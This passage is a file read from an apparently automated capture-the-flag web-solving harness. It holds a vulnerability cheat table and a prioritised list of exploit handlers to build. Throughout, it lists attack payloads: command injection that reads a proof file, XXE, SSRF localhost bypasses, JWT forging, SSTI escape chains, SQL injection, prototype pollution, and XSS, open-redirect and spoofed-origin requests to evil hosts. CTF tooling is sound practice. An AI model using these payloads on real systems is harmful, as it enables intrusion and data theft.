cross-site, Mode: navigate, Dest: document, foreign Referer; GET /api/preferences\nupload_shape/render_route/preview_guide                -> upload (D10)       -> POST JSON {filename:\"n.html\",content:\"<p>{{objective}}</p>\",\n  \"upload form has standards. Low ones\"                     content_type:\"text/html\"} -> GET the returned path\n\"template engine evaluates\", \"speak in expressions\",   -> SSTI (D11)         -> feature?template=a${7*7}b{{7*7}}c (one probe per param:\n  empty \"Rendered message\" <pre>                            template|message|q|name|text) -> {{objective}} in the family that gave 49\n\"plant ... come back later\", \"delayed echo\",           -> 2nd-order SQLi     -> POST JSON {every field: \"x' OR '1'='1' -- \"} (also\n  feature post_required, secondary {\"rows\":[]}               \"zz' OR 1=1 --\"), GET secondary after each plant -> rows[] has proof\n\"API binds whatever you hand it\", \"promotion\",         -> mass assignment    -> POST JSON {display_name, role:\"admin\", is_admin, isAdmin,\n  feature post_required, secondary administrator_required    admin, roles:[\"admin\"], access_level, permissions}; GET secondary\ninventory_route + protected_reference, \"take inventory  -> field/action authz -> GET inventory; feature?id=<protected>&fields=<f>&action=<a> for\n  ... every field, every function\", field_action_forbidden    (D14)                 EVERY single f x a (lists / * are forbidden) -> evidence\n\"fetch anything you point it at\", \"internal service\",  -> SSRF (D15)        -> feature?url=http://127.0.0.1:8080<secondary>; port 80/localhost =\n  feature absolute_url_required, secondary internal_only                       fetch_failed -> ladder :8080 :80 :5000 :8000 :3000; param from error\ncurrent_role / role cookie / X-*-Role                  -> role tampering     -> set the named value to admin (cookie, header, claim)\neyJ..eyJ..sig in cookie/Authorization                 -> JWT                -> alg none / leaked secret, role claim\nlocation.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check\n?next=/?return=/redirect_uri                           -> open redirect      -> point it at the clue route / //other-host\n\"ping\", \"host lookup\", \"diagnostics\"                  -> command injection  -> ;cat /run/huntress/objective.txt  (| $() ` %0a)\nSSRF filtered (blocked_host / scheme_not_allowed)      -> SSRF sequel        -> 2130706433, 127.1, [::1], 0.0.0.0, allowed@127.0.0.1, file:///run/...\n/api/v1 vs /v2, \"legacy\", \"beta\", deprecated in docs  -> shadow API (API9)  -> the protected op on every version-swapped / undocumented path\n\"internal only\", \"localhost only\"                      -> header trust       -> X-Forwarded-For: 127.0.0.1 (+ X-Original-URL)\nXML/SVG/DOCX upload                                    -> XXE                -> <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">\n\"__proto__\", JSON merge \"settings\", Node banner        -> prototype pollution -> {\"__proto__\":{\"isAdmin\":true}} then re-read secondary\nA real victim browser exists (D07): anything \"the admin/reviewer visits\" can run your JS with their cookies; receipts\ncan land >12 s later. \"Browser\"/\"stranger\" checks without a bot (D06, D09) = send the Sec-Fetch-* + Referer/Origin\nmatrix yourself. NEW CLASS = write lib/web/handlers/dayNN_*.py (KEY_MAP + HANDLERS) BEFORE the single submit (D11\ndid -> TT first try; D09, D10, D12, D13, D15 TT went solver_incomplete). Banners are costume; the title pun names the bug.\n```\n\n## Readiness gaps\n\nPriority 1 = plausible within ~3 calendar days (~6-9 lane-days at the current pace). \"prebuild\" = pure python handler\n(request planner + response parser, no I/O; the solver fetches) with offline fixtures = recorded bodies incl. a\ndecoy. \"note\" = harness/prompt change. \"tool\" = install. None built (no web prebuild lane, no `web:*` keys in\n.run/prebuild-state.json). Dropped after D13: `ssti-engine-probe` (seen D11), `port-day22-handlers`. Dropped after\nD15: `ssrf-planner` (seen D15; replaced by `ssrf-filter-bypass`); D14's inventory field x action read folded into\n`bopla-field-read` (now the no-inventory sibling). Added after D15: `ssrf-filter-bypass`, `api-shadow-version`,\n`api-resource-limit-overread`, `api-unsafe-consumption`.\n\n```json\n[\n  {\"id\": \"enable-web-prebuild-lane\", \"concept\": \"harness: web is not a prebuild lane\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Still true after D15 (hctf/prebuild.py has no `web` string at all): hctf/prebuild.py LANES has no `web` entry (AUTO_LANES lists 5 lanes) and .run/prebuild-state.json has no web:* keys, so no prebuild gap below can drain. lib/web/handlers/ already loads per-day plugins `dayNN_*.py` exporting KEY_MAP + HANDLERS (D23 added three) -> the writable target is a new plugin file per gap, e.g. lib/web/handlers/prebuilt_<id>.py, + tests/data/web_fixtures/. Owner of hctf/: add `web: {brief: prebuild_web, writable: (lib/web/handlers/prebuilt_, tests/data/web_fixtures/), targets: tests/data/web_fixtures/TARGETS.json, gate: (tests/test_lane_fixtures.py,), regress_lane: web, requires: (lib/web/handlers/__init__.py:_load_plugins,)}`. Fixtures = saved target responses (targets 410 after CORRECT).\"},\n  {\"id\": \"codify-before-tt\", \"concept\": \"harness: the class handler must exist before Time Trial starts\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D15 repeated it: Fetch Quest TT started 13:18:04Z, ~5 s after single CORRECT, and the codify worker's lib/web/handlers/day24_web_fetch_quest.py landed ~1 min later -> TT solver_incomplete 41 s, live worker hand-solved. Same on D12/D13 (41 s, 12.9 s). D11 (plugin written before submit) and D14 went first try. Owner of hctf/ + web skill: for web, gate TT start on the codify worker (or on solver-test passing the single case), and tell the single worker to write the plugin handler (KEY_MAP + HANDLERS, generic over param/field/route words) before `hctf submit`.\"},\n  {\"id\": \"cmd-injection-planner\", \"concept\": \"OS command injection to read the mounted proof (row 10)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"For each flagged param (host, ip, target, domain, filename, cmd): separators ; | || && %0a $() backticks, with/without a valid prefix (127.0.0.1), reading the prompt path (default /run/huntress/objective.txt) via cat, `$(cat ...)` echoed, `${IFS}` space bypass. Parser: proof regex in response / tool output block.\"},\n  {\"id\": \"xxe-payloads\", \"concept\": \"XML external entities (row 18)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"XML endpoints/uploads: in-band entity on the prompt path, parameter-entity variant, php://filter base64, XInclude, SVG / DOCX (zipfile) container builder carrying the entity. Parser: proof regex, base64 decode. D10 proved an upload kit with `upload_shape: POST JSON filename/content/content_type`; an XML/SVG sibling is the obvious sequel -> also try content_type application/xml / image/svg+xml through the same upload route and the preview path.\"},\n  {\"id\": \"jwt-session-forge\", \"concept\": \"JWT alg:none / leaked-secret HS256 / Flask-itsdangerous / Express s: cookies (rows 7, 8)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Session family opened on D08. Pure python (hmac, hashlib, base64, json, zlib): decode JWT; produce alg none ('none'/'None'/'NONE', empty sig), HS256 re-signed with secrets FOUND in recon (clues, backups, .env, JS, comments), RS256->HS256 with a published public key (jwks.json). Flask session: base64url(zlib?) payload.timestamp.sig with itsdangerous derive (salt 'cookie-session', HMAC-SHA1) re-signed with a leaked secret. Escalate role/admin/sub (current_role analyst -> admin). No secret brute force beyond what the app leaks.\"},\n  {\"id\": \"role-tamper-planner\", \"concept\": \"client-controlled role: header / query / cookie / claim (row 6; body binding seen D13)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every clue JSON (still on D14/D15) shows current_role: analyst; D13 granted admin via JSON body binding (mass assignment, seen) -- the sibling forms are untested. From recon: role field and values (current_role, role, is_admin, group, tier), app-set cookies, headers named in clues/errors. Plan: cookie role=<admin|administrator|staff|owner|higher listed value>, base64-JSON cookie rewrite, X-Role / X-User-Role / X-Forwarded-User / X-Admin: true, ?role=admin / ?admin=1, PATCH/PUT of the profile route with the D13 privilege key set. Then re-read the secondary route (403 administrator_required -> evidence). Parser: proof regex.\"},\n  {\"id\": \"open-redirect-planner\", \"concept\": \"open redirect / OAuth redirect_uri (row 24b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Params next, return, returnTo, redirect, url, continue, redirect_uri, callback on login/logout/OAuth routes. Payloads: //evil, /\\\\evil, https:evil, %2F%2Fevil, /%09/evil, https://<base>@evil, javascript: (if the sink is client-side), plus the clue route as an internal target. Detect via Location header (don't follow) or meta-refresh/JS; when OAuth, leak the code/token to a clue route and replay it. Parser: effect JSON / proof.\"},\n  {\"id\": \"dom-xss-sink-scan\", \"concept\": \"DOM XSS: client-side source -> sink (row 13c)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Third XSS flavour after D06 reflected / D07 stored. Static scan of inline and linked JS for sources (location.hash/search/href, document.referrer, postMessage data, localStorage) flowing into sinks (innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout(string), jQuery html()/$(), href/src assignment). Build the URL (#<img src=x onerror=fetch(cb?nonce)>, ?q=, javascript:) and deliver it the way the app expects: GET the callback ourselves with D06 fetch-metadata headers + Referer = crafted URL, or hand the URL to a report/bot endpoint and poll for the receipt.\"},\n  {\"id\": \"clue-json-router\", \"concept\": \"map /api/clues keys + bare-route JSON errors + prompt verbs to the concept and the next request\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every target since D05 serves /api/clues {framework, feature_route, secondary_route, current_role, <concept key>}. Pure function: clues JSON (+ bare-route error bodies) -> concept + request plan. Known keys: session_hint (D08 fixation: GET feature?sid=<hint>, then secondary with Cookie arena_session=<hint>; also try session_id/session/PHPSESSID names), callback_nonce (D06: reflect <script>fetch(secondary?nonce=N)</script> via ?q= on feature, then GET secondary?nonce=N with Sec-Fetch-Site same-origin / Mode cors / Dest empty, Referer reflected URL, Origin, X-Callback-Nonce), moderator_data_route + receipt_route_template (D07 stored XSS payload builder with id from location.pathname), feature_route alone (D05 GET/POST). Known errors: session_id_required, authenticated_login_required, browser_callback_required, not_found. Select routes by KEY, never by the word in the value (callback|internal|status re-dealt). Unknown key -> return it as a hint for the worker. Fixtures: D05/D06/D08 clue bodies from the day-20/21 worker logs. Add D09: preferences_route (+ form with hidden csrf_token) -> CSRF handler (cross-site fetch-metadata submit, then GET /api/preferences); D10: upload_shape / render_route / preview_guide / upload_policy -> upload handler (POST JSON html with {{objective}}, GET returned path). Both handlers exist in challenges/day22/web-*/solver/solve.py (csrf(), upload()). Errors: signed_in_session_required, invalid_destination, method_not_allowed, file_not_found. D11-D13 had NO concept key, so add a second stage: bare GET of each route -> `post_required` (405: POST sink -> second-order / mass-assignment / injection by body), `administrator_required` (403 on secondary: privilege bound elsewhere), empty `Rendered message <pre>` (render sink -> SSTI probe on ?template=), plus prompt verbs (\\\"binds whatever you hand it\\\" -> mass assignment, \\\"plant ... come back later\\\" -> second-order, \\\"evaluates everything\\\" -> SSTI). Plugins: lib/web/handlers/day23_web_template_temper.py, day23_web_ask_again_later.py, day23_web_posted_too_much.py. D14: inventory_route + protected_reference -> fetch inventory JSON {route, query_parameters, fields, actions, public_reference} and enumerate field x action on the protected id (error id_fields_action_required / field_action_forbidden) -- plugin day24_web_the_api_has_opinions.py. D15 (no concept key): feature 400 absolute_url_required + secondary 403 internal_only -> SSRF (feature?url=http://127.0.0.1:8080<secondary>) -- plugin day24_web_fetch_quest.py; error fetch_failed = wrong host/port, keep laddering.\"},\n  {\"id\": \"mastery-concept-dispatcher\", \"concept\": \"run every known lane concept on every target without recursion or starvation\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D08 Mastery (3 targets) took ~15 min: racing every earlier solver on every target slowed the app 5 s -> 13 s, and day-21 solvers' fallback() imported each other (infinite recursion). Registry in lib/web/ (package; see lib/web/__init__.py): concept -> (detector over recon pages: home, robots, /api/clues, /openapi.json; request planner). Stage 1 = concepts the detectors hit (clue keys first), stage 2 = the rest, capped concurrency per host (~3). One flat registry replaces solvers importing each other. Fixture: recorded multi-target pair (D04 LFI + D07 board) with today's prompt for the wrong one. D15 Mastery had 4 targets (first time); all known handlers answered them in 3.2 s, so the registry works when every class has a plugin -- keep per-host concurrency capped.\"},\n  {\"id\": \"recon-crawl-depth2\", \"concept\": \"shared recon planner: robots/sitemap/openapi/comments/clue JSON/links, depth 2 (rows 1, 5, 22)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Given fetched bodies keyed by path, return next same-origin GETs: robots Allow/Disallow, sitemap <loc>, openapi.json `paths` (fill {id} from submit responses), href/src/action, fetch('/..') literals, HTML-comment paths, every '/...' string in JSON, links on any directory index (depth 2), cap ~40, skip /assets. Parser: proof_[0-9a-f]{32} after JSON/base64/zip/gzip decoding. Fixtures: D01 robots -> index -> .json.bak, D07 openapi with /api/postcards + /postcards/{id}.\"},\n  {\"id\": \"fetch-metadata-matrix\", \"concept\": \"server-judged 'browser' checks: Sec-Fetch-* / Referer / Origin matrix (rows 13a, 24a, 15)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D06 (same-origin callback) and D09 (cross-site CSRF) were both judged purely by request headers, no bot. Pure planner: given a route, a base URL and an optional 'from' page URL, emit header sets {Sec-Fetch-Site: same-origin|same-site|cross-site|none} x {Mode: navigate|cors|no-cors} x {Dest: document|empty|iframe} with matching Referer (from-page / foreign https://evil.example/ / none) and Origin (base / foreign / null), ordered by the error/flag the app returned (browser_callback_required -> same-origin cors; changed_across_sites:false -> cross-site navigate). Parser: evidence/proof regex + boolean flags in the JSON. Fixtures: D06 callback and D09 /api/preferences bodies from day21/day22 logs.\"},\n  {\"id\": \"record-target-responses\", \"concept\": \"replayable live-target cases\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Targets 410 after CORRECT; D07 Mastery's proof-2 fix could only be tested on a hand-built mock. Harness: log every target request/response during single/TT/Mastery into solver/cases/<case>/http/ and let solve.py replay them when the host 410s; also the fixture source for the web prebuild.\"},\n  {\"id\": \"stopgate-503-already-solved\", \"concept\": \"harness: a 503 submit that landed leaves the stop gate closed\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D07 Mastery: submit returned HTTP 503 temporarily_unavailable though the GM registered CORRECT; the retry returned already_solved and stop_gate.py (counts only accepted/correct rows) never released. Owner of hctf/: after a 503, check op=status before retrying, and count already_solved for the owed attempt as done. Same for unverified live variants with expected.json {} (D08 Mastery).\"},\n  {\"id\": \"prototype-pollution\", \"concept\": \"server-side prototype pollution (row 25)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Node-flavoured JSON merge/settings routes: {\\\"__proto__\\\":{\\\"isAdmin\\\":true,\\\"role\\\":\\\"admin\\\"}}, {\\\"constructor\\\":{\\\"prototype\\\":{...}}}, query-string a[__proto__][x]=1; then re-request the clue/status route. Detect via a reflected polluted key (e.g. json spaces / status code gadgets). D13 (NestJS mass assignment) makes the JSON-merge sibling more likely: after the pollution POST, GET secondary_route (administrator_required) and look for evidence. Raised to 1 after D15: the API run (D13 mass assignment -> D14 property authz) keeps the JSON-object-binding family hot and Node costumes recur.\"},\n  {\"id\": \"ssrf-filter-bypass\", \"concept\": \"SSRF sequels: filtered host/scheme, redirect, file://, blind (row 12b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D15 was the plain form (feature?url=http://127.0.0.1:8080<internal_only route>; port 80 -> fetch_failed). Sequels in the D10->D11 / D03->D12 style: blocklist on 127.0.0.1/localhost -> 2130706433, 0x7f000001, 017700000001, 127.1, 127.0.0.1.nip.io-style only if the app names it, [::1], [::ffff:127.0.0.1], 0.0.0.0; allowlist 'must start with/contain <host>' -> https://<allowed>@127.0.0.1:8080/, http://127.0.0.1:8080#@<allowed>, ?u=<allowed>; scheme filter -> file:///run/huntress/objective.txt, FILE://, gopher only if named; redirect hop via an app-owned open redirect (row 24b) or a clue route that 302s; POST/JSON body {url} when GET 405s; port ladder 8080, 80, 5000, 8000, 3000, 8888, 9000 from error hints. Parser: proof regex in the proxied body, base64/JSON-wrapped content fields. Fixture: D15 error bodies (absolute_url_required, internal_only, fetch_failed) + a mocked blocked_host.\"},\n  {\"id\": \"api-shadow-version\", \"concept\": \"improper API inventory: shadow / deprecated / beta endpoint skips the check (row 39, OWASP API9)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D13-D15 walked the OWASP API Top 10 (API3, API5, API7) and D14's prompt said 'take inventory of every endpoint'. Planner: from /api/inventory, /openapi.json, /swagger.json, /api-docs, /v2/api-docs, /api/clues and JS literals, collect every path; emit version swaps (/api/v2/x -> /api/v1/x, /api/x -> /api/v0|beta|internal|legacy|old/x), `X-API-Version: 1`, `?version=1`, `Accept: application/vnd.<app>.v1+json`; call the protected operation (protected_reference / admin route) on each. Parser: proof regex; 403 on the current version + 200 on the shadow = the bug.\"},\n  {\"id\": \"nosql-operator-injection\", \"concept\": \"MongoDB-style operator injection (row 19)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"JSON bodies: {\\\"$ne\\\":null}, {\\\"$gt\\\":\\\"\\\"}, {\\\"$regex\\\":\\\".*\\\"}; form username[$ne]=x; $where only when Mongo-flavoured. Field names from the form/JS. Parser: proof or an admin page with the returned session.\"},\n  {\"id\": \"deserialization-gadgets\", \"concept\": \"pickle / PHP / node-serialize cookies (row 21)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Recognise base64 cookies gASV/gAN (pickle), Tzo/YTo (PHP), {\\\"rce\\\" / _$$ND_FUNC$$_ (node-serialize), rO0 (Java). Prefer data tampering (isAdmin/role) over code execution; minimal gadget reading the prompt path otherwise.\"},\n  {\"id\": \"ssti-sandbox-escape\", \"concept\": \"SSTI sequels: filtered/sandboxed engine, file read, stored template (row 11b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D11 rendered `{{objective}}` directly (context var) under a Spring Boot costume; `{{T(java.lang.Runtime)}}` printed a class, ${..}/*{..} stayed literal. A sequel may hide `objective` or filter `{{`. Planner: fingerprint by arithmetic family ({{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>, {{7*'7'}} -> 7777777 Jinja2 / 49 Twig), then per-engine reads of the prompt path: Jinja2 cycler.__init__.__globals__.os.popen / lipsum / request.application, Twig source() / _self.env, SpEL T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/run/huntress/objective.txt')), Freemarker ?new() / ?api, ERB File.read, EJS/Nunjucks/Handlebars constructor chains, Thymeleaf __${..}__::. Filter bypasses: attr()/|join, hex/unicode, request.args indirection. Also plant in stored fields read later (row 37). Parser: proof regex in rendered body.\"},\n  {\"id\": \"stored-second-order-generic\", \"concept\": \"plant now, read on another route: second-order for any class (row 37)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D12 pattern generalised: feature_route = POST sink (`post_required`, `saved:true`), secondary_route = later reader. Planner takes a per-class payload list (SQLi ladder, SSTI `{{objective}}`/`${..}`, cmd `;cat <prompt path>`, XSS for a bot) and plants each as JSON (then form) in every common field (name,q,query,note,label,title,value,filter,search,term,report,display_name,bio,comment,message) in one body, re-GETs every reader route after EACH plant. Parser: proof regex only (D12 prints `effect` even when rows are empty).\"},\n  {\"id\": \"header-trust-verb-path-bypass\", \"concept\": \"IP/header trust, method override, path normalisation (rows 15-17)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"For a route that 401/403/405s: X-Forwarded-For / X-Real-IP / X-Client-IP / True-Client-IP / Forwarded: for=127.0.0.1; X-Original-URL / X-Rewrite-URL; methods HEAD/POST/PUT/PATCH/OPTIONS + X-HTTP-Method-Override / _method; path variants /ADMIN, /admin/, /admin/., //admin, /./admin, /admin;/, /%61dmin, /admin..;/, trailing ?/#. Stop at the first 200 with proof or effect.\"},\n  {\"id\": \"sqli-union-blind\", \"concept\": \"UNION / error / boolean-blind SQLi (row 28)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D03 tautology and D12 second-order are seen. Remaining: ORDER BY / NULL-count columns, UNION SELECT with table names from errors or sqlite_master / information_schema, marker-based string column, boolean-blind with a length/row-count oracle (bounded alphabet [0-9a-f_proof], 32 chars), time-based (sleep/randomblob) only when nothing differs, login bypass admin'--. Payloads delivered as JSON body AND query/form (D12 bound JSON only). SQLite/MySQL/Postgres dialects. Title puns to expect: \\\"yes or no\\\", \\\"takes its time\\\", \\\"union\\\".\"},\n  {\"id\": \"logic-race-reset\", \"concept\": \"business logic, race, predictable reset tokens (rows 26, 27)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Numeric fields (negative, zero, huge, float), coupon/redeem replay, ~20-request parallel burst for a single-use action, reset tokens the app leaks (timestamp, md5(email), sequential). No credential guessing.\"},\n  {\"id\": \"type-juggling-auth\", \"concept\": \"loose comparison / JSON type confusion in auth or token checks (row 34)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"PHP/Laravel or Node costume with a token/PIN/password compare. JSON bodies with true, 0, \\\"0\\\", [], {}, null, \\\"0e1\\\" magic hashes, arrays where strings are expected (strcmp(array) == 0), numeric strings with whitespace. Field names from the form/clues. Parser: effect+evidence / proof.\"},\n  {\"id\": \"cors-misconfig-probe\", \"concept\": \"CORS reflected Origin with credentials (row 24c)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Request the clue data routes with Origin: https://evil.example, null, <base>.evil.example, sub.<base>; flag ACAO echoing + ACAC true. Exploit via the victim bot: stored/bot-visited script fetch(DATA,{credentials:'include'}) from a cross-origin page and POST to the app's receipt route; or the app may judge it server-side by the Origin header (effect JSON).\"},\n  {\"id\": \"session-id-weakness\", \"concept\": \"session hijack: predictable / leaked / non-rotated session ids (row 32)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D08 sequel. Collect every session-like value the app reveals (Set-Cookie, clue hints, URLs, /api/history, logs pages, Referer leaks); detect structure (sequential int, timestamp, md5(user), base64 JSON); plan reuse of a leaked victim id as arena_session/sid cookie and a logout-then-reuse check. Never guess beyond values the app derives from data it shows.\"},\n  {\"id\": \"vcs-debug-leak-reader\", \"concept\": \"exposed .git / .env / DEBUG pages (row 22)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Probe /.git/HEAD, /.git/config, /.env, /.DS_Store, /debug, /actuator/env, /phpinfo.php within the capped recon list. Parser: .git loose objects (zlib) -> commit -> tree -> blob, .DS_Store names, Django DEBUG 404 URL list, .env secrets -> jwt-session-forge.\"},\n  {\"id\": \"graphql-introspection\", \"concept\": \"GraphQL schema leak / hidden field (row 23)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Introspection query, list fields, query hidden ones (proof, secret, evidence, note) and node(id) lookups (IDOR over GraphQL); field suggestions when introspection is off.\"},\n  {\"id\": \"lfi-filter-bypass\", \"concept\": \"traversal filters / suffix / prefix rules (row 29)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Planner from D04's set: nested strip (....//, ..././), URL / double / overlong encodings, backslash, required prefix (pages/../../..), appended suffix (%00, ?, #, php://filter), absolute, file://, /proc/self/cwd and /proc/self/root. Cheapest first; decode base64 filter output.\"},\n  {\"id\": \"upload-filter-bypass\", \"concept\": \"upload sequels: enforced type filter, served-path traversal, stored SVG/HTML (row 20b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D10's policy (txt, text/plain) was never enforced. Sequel planner over the same upload_shape (JSON filename/content/content_type, or multipart if the form says so): double extension (n.txt.html, n.html.txt), case (N.HTML), trailing dot/space, content_type spoof vs extension, GIF89a/PNG magic prefix, filename traversal (../n.html, ..%2fn.html) to land in a served dir named by the clues, SVG with script or XXE, template syntax in the content per the guide. Parser: read the returned path/url, GET it, proof regex.\"},\n  {\"id\": \"headless-browser\", \"concept\": \"client-side JS execution for DOM XSS / CSRF checks (rows 13c, 24a)\", \"priority\": 2, \"action\": \"tool\", \"detail\": \"D06-D07 needed none (server-judged headers; GM-side bot). Install only if a day demands local JS execution: `uv pip install --python .venv/bin/python playwright && .venv/bin/playwright install chromium` (or system chromium --headless --dump-dom).\"},\n  {\"id\": \"bopla-field-read\", \"concept\": \"excessive data exposure / hidden-field read on API routes (row 36)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D14 showed the property-level read side through an explicit `fields`+`action` pair on an inventory-listed route (seen, handler exists). Remaining sibling: routes WITHOUT an inventory where hidden keys come back through ?fields=*, ?include=all, ?expand=*, ?view=admin|full|debug, ?debug=1, Accept: application/vnd.api+json, or list endpoints returning keys the HTML omits (secret, proof, note, internal). Compare key sets against the page. Parser: proof regex after JSON flattening.\"},\n  {\"id\": \"api-resource-limit-overread\", \"concept\": \"unrestricted resource consumption / pagination over-read (row 40, OWASP API4)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"List routes with limit/page_size/per_page/offset/page: plan limit=1000|100000|-1|0, page=0|-1, offset beyond the public window, size=all, and batch/array ids (id=1,2,3 / ids[]=). Look for records past the public set carrying proof/secret. No flooding: <= 10 requests.\"},\n  {\"id\": \"http-param-pollution\", \"concept\": \"duplicate params / keys split between proxy and app (row 35)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"For a route whose check and action read the same param: a=safe&a=evil, a[]=..., JSON duplicate keys (first vs last wins), mixed query + body copies, ; separators. Order the planner by which copy the error names. Parser: proof regex.\"},\n  {\"id\": \"cache-host-header\", \"concept\": \"web cache poisoning / Host-header attacks (row 30)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Unkeyed headers (X-Forwarded-Host, X-Host, X-Forwarded-Scheme, X-Original-URL) reflected into cached responses (Age/X-Cache/CF-Cache-Status) or password-reset links; plan: poison with the clue callback route, then fetch as the victim/bot path. Cloudflare sits in front, so key on app-level cache headers only.\"},\n  {\"id\": \"api-unsafe-consumption\", \"concept\": \"app trusts a third-party / webhook / callback response (OWASP API10)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Routes that import from a URL or accept a webhook payload and then act on the content (e.g. 'sync profile from partner'): point at an app-owned echo/paste route or a data: URL we control, return JSON with role/admin/redirect fields; chains with SSRF (row 12) and mass assignment (row 9). Parser: proof regex on the follow-up secondary route.\"}\n]\n```\n","numLines":97,"startLine":107,"totalLines":203}},"tool_result_meta":[{"id":"toolu_017qdYxtYJZtBtXe6qjhwj26","permission_decision":{"decision":"accept","source":"config","reason_type":"mode"}}]}
